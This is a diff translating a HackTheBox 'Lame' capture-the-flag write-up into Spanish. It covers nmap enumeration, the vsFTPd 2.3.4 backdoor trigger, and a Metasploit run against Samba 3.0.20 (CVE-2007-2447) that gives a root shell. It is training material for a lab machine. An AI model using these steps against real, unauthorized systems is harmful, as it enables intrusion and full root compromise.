@@ -1,28 +1,28 @@
 # Lame — HackTheBox Write Up
 
-**Difficulty:** Easy  
+**Dificultad:** Easy  
 **OS:** Linux  
-**Author:** ph4n3s
+**Autor:** ph4n3s
 
 ---
 
-## 1. Enumeration
+## 1. Enumeración
 
-First I connect to the VPN and ping the machine to confirm connectivity and operating system.
+Primero me conecto a la VPN y hago un ping a la máquina para confirmar conectividad y sistema operativo.
 
 ```bash
 ping -c 5 10.129.76.110
 ```
 
-The returned TTL is **63**, which confirms we are dealing with a **Linux** machine.
+El TTL devuelto es **63**, lo que confirma que estamos ante una máquina **Linux**.
 
-I continue with a port scan to see what is exposed:
+Continúo con un escaneo de puertos para ver qué hay expuesto:
 
 ```bash
 nmap -p- -T4 --min-rate 5000 10.129.76.110
 ```
 
-Open ports:
+Puertos abiertos:
 
 ```
 21/tcp   open  ftp
@@ -32,13 +32,13 @@ Open ports:
 3632/tcp open  distccd
 ```
 
-Once the ports are confirmed, I run a more detailed scan to get versions and scripts:
+Una vez confirmados los puertos, hago un escaneo más detallado para obtener versiones y scripts:
 
 ```bash
 nmap -p 21,22,139,445,3632 -sVC -T4 --min-rate 5000 10.129.76.110 -oN targeted
 ```
 
-Relevant results:
+Resultados relevantes:
 
 ```
 21/tcp   open  ftp         vsftpd 2.3.4
@@ -48,37 +48,37 @@ Relevant results:
 3632/tcp open  distccd     distccd v1 (GNU 4.2.4)
 ```
 
-nmap also confirms that the FTP has **anonymous login enabled**.
+El nmap también me confirma que el FTP tiene el **login anónimo habilitado**.
 
 ---
 
-## 2. Vulnerability analysis
+## 2. Análisis de vulnerabilidades
 
 ### FTP — vsFTPd 2.3.4
 
-I connect as `anonymous` to see what is there:
+Me conecto como `anonymous` para ver qué hay:
 
 ```bash
 ftp 10.129.76.110
-# user: anonymous
+# usuario: anonymous
 # password: (enter)
 ```
 
-The directory is empty. The anonymous FTP was a rabbit hole, there is nothing here.
+El directorio está vacío. El FTP anónimo era un rabbit hole, no hay nada aquí.
 
-I look into the version and it turns out **vsFTPd 2.3.4** has a known backdoor (**CVE-2011-2523**): if the username contains `:)`, the server opens a shell on port 6200. I try it but it does not work in this case — probably the machine has the port blocked or the backdoor is not active on this instance.
+Investigo la versión y resulta que **vsFTPd 2.3.4** tiene una backdoor conocida (**CVE-2011-2523**): si el usuario contiene `:)`, el servidor abre una shell en el puerto 6200. Lo intento pero no funciona en este caso — probablemente la máquina tiene el puerto bloqueado o la backdoor no está activa en esta instancia.
 
-**Important lesson: do not fixate on the first vector and keep enumerating.**
+**Lección importante: no fijarse solo en el primer vector y seguir enumerando.**
 
 ### Samba — 3.0.20
 
-I focus on ports 139 and 445. The **Samba 3.0.20** version has a known critical vulnerability (**CVE-2007-2447**): the `username map script` allows command injection through the username field. There is a Metasploit module that exploits it directly.
+Me fijo en los puertos 139 y 445. La versión **Samba 3.0.20** tiene una vulnerabilidad crítica conocida (**CVE-2007-2447**): el `username map script` permite inyección de comandos a través del campo de usuario. Hay un módulo en Metasploit que la explota directamente.
 
 ---
 
-## 3. Exploitation
+## 3. Explotación
 
-I launch Metasploit with the matching module:
+Lanzo Metasploit con el módulo correspondiente:
 
 ```bash
 msfconsole -q
@@ -88,13 +88,13 @@ set LHOST tun0
 run
 ```
 
-I get a shell as **root** directly. This version of Samba runs with root privileges, so there is no need to escalate.
+Obtengo una shell como **root** directamente. Esta versión de Samba corre con privilegios de root, por lo que no hace falta escalar.
 
 ---
 
-## 4. Post-exploitation
+## 4. Post-explotación
 
-With the obtained shell I navigate to the flags:
+Con la shell obtenida navego a las flags:
 
 **User flag:**
 
@@ -114,9 +114,9 @@ cat /root/root.txt
 
 ---
 
-## 5. Conclusions
+## 5. Conclusiones
 
-- **vsFTPd 2.3.4** has a known backdoor but in this case it was not the right vector.
-- **Samba 3.0.20** is the real vulnerability of the machine and gives direct access as root.
-- Properly enumerating all services before jumping on the first one that appears is key.
-- The ping TTL already gives us a hint about the OS before doing any scan.
+- **vsFTPd 2.3.4** tiene un backdoor conocido pero en este caso no era el vector correcto.
+- **Samba 3.0.20** es la vulnerabilidad real de la máquina y da acceso directo como root.
+- Enumerar bien todos los servicios antes de lanzarse a explotar el primero que aparece es clave.
+- El TTL del ping ya nos da una pista del OS antes de hacer cualquier escaneo.
